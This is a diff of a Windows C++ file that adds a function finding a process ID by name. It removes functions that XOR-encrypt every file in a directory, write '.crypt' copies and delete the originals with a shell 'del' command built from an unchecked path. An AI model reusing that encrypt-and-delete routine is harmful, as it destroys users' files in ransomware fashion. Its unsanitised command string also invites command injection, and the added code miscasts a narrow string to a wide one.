@@ -1,7 +1,9 @@
+#include <windows.h>
+#include <tlhelp32.h>
+#include <vector>
 #include <string>
 #include <fstream>
-#include <vector>
-#include <windows.h>
+
 
 std::wstring string_to_wstring(std::string& s) {
 	std::ofstream ofs("temp.txt", std::ofstream::out);
@@ -33,14 +35,24 @@ std::string wstring_to_string(std::wstring s) {
 	return s1;
 }
 
-std::string readFile(const std::string fileName) {
-	std::ifstream f(fileName);
-	f.seekg(0, std::ios::end);
-	size_t size = f.tellg();
-	std::string s(size, ' ');
-	f.seekg(0);
-	f.read(&s[0], size);
-	return s;
+DWORD GetProcessID(const char* lpNameProcess) {
+	HANDLE snap;
+	PROCESSENTRY32 pentry32;
+	snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (snap == INVALID_HANDLE_VALUE) return 0;
+	pentry32.dwSize = sizeof(PROCESSENTRY32);
+	if (!Process32First(snap, &pentry32)) {
+		CloseHandle(snap);
+		return 0;
+	}
+	do {
+		if (!lstrcmpi((LPCWSTR)lpNameProcess, &pentry32.szExeFile[0])) {
+			CloseHandle(snap);
+			return pentry32.th32ProcessID;
+		}
+	} while (Process32Next(snap, &pentry32));
+	CloseHandle(snap);
+	return 0;
 }
 
 std::vector<std::string> scandir(std::string p) {
@@ -60,39 +72,4 @@ std::vector<std::string> scandir(std::string p) {
 	}
 
 	return v;
-}
-
-std::string CryptFile(std::string path, int key) {
-	try {
-		std::string data = readFile(path), delcmd = "del " + path, cryptdata;
-		for (unsigned int item = 0; item < data.length(); ++item)
-			cryptdata += data[item] ^ key;
-
-		std::ofstream crfile(path + ".crypt");
-		for (unsigned int item = 0; item < cryptdata.length(); ++item)
-			crfile << cryptdata[item];
-
-		crfile.close();
-		system(delcmd.c_str());
-		return "crypt " + path + " ok";
-	}
-	catch (...) {
-		return "crypt " + path + " failed";
-	}
-}
-
-std::string CryptDir(std::string path, int key) {
-	std::string buf;
-	std::vector<std::string> v;
-	v = scandir(path + "*");
-	for (unsigned int i = 0; i < v.size(); i++) {
-		try {
-			CryptFile(path + v[i], key);
-			buf += "crypt " + path + v[i] + " ok\n";
-		}
-		catch (...) {
-			continue;
-		}
-	}
-	return buf;
 }
